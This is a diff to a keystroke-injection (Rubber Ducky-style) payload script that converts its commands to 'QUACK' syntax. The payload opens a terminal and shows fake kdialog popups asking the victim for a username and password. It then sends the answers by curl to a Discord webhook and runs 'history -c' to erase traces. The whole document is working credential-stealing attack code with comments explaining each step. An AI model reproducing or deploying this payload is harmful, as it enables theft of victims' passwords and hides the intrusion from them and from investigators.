@@ -17,30 +17,30 @@
 *          - It is important that the popup payload occurs in a single line so that the traces of data collection are eliminated immediately after submission. This is precisely why you can see the * ed code to get a good understanding of what it is all about.
 
 
-DELAY 1000
-CTRL-ALT t
-DELAY 2000
+QUACK DELAY 1000
+QUACK CTRL-ALT t
+QUACK DELAY 2000
 
 *  REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
-STRING WEBHOOK_URL="WEBHOOK"
-ENTER
-DELAY 500
+QUACK STRING WEBHOOK_URL="WEBHOOK"
+QUACK ENTER
+QUACK DELAY 500
 
 
 *  A short and efficient cURL command to send an HTTP POST request to a webhook URL with JSON data in the request body.
-STRING $(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(
+QUACK STRING $(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(
 
 *  A compact command that uses kdialog to display a popup message prompting (into the curl content section) the user to enter their username and password to proceed. You can't acquire multiple input in one popup, so you should use multiple popup, as i wrote here.
 *  You can set the title, the message, the input type and so and so on...
-STRING kdialog --title "Popup Title" --msgbox "Insert your username and password for go on"; 
-STRING kdialog --title "Insert your Username" --inputbox "Username"; 
-STRING kdialog --title "Insert your Password" --password "Password" --default "password";
+QUACK STRING kdialog --title "Popup Title" --msgbox "Insert your username and password for go on"; 
+QUACK STRING kdialog --title "Insert your Username" --inputbox "Username"; 
+QUACK STRING kdialog --title "Insert your Password" --password "Password" --default "password";
 
 *  The end part of the curl payload...
-STRING )\"}" $WEBHOOK_URL); 
+QUACK STRING )\"}" $WEBHOOK_URL); 
 
 *  history -c will clear the last shell history and the exit command will close the popup at the end of the execution
-STRING history -c; exit;
+QUACK STRING history -c; exit;
 
 *  All-In-One doesn't need delay time
-ENTER
+QUACK ENTER
